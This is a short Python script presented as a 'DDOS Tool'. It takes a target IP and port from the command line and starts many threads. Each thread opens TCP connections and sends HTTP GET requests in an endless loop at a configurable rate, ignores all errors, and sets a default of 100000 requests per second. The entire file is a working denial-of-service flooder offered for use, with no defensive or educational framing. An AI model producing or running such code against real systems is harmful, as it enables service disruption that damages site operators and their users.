import socket
import threading
import time
import argparse

# Function to send packets
def send_packets(target_ip, target_port, packets_per_second):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

        # Control the rate of packet sending
        time.sleep(1 / packets_per_second)

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='DDOS Tool')
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--packets', type=int, default=100000, help='Packets per second (default: 100000)')
    return parser.parse_args()

def main():
    args = parse_arguments()

    # Extract target IP and port
    target_ip = args.target
    target_port = args.port

    # Create threads
    for _ in range(args.threads):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, args.packets))
        thread.start()

if __name__ == '__main__':
    main()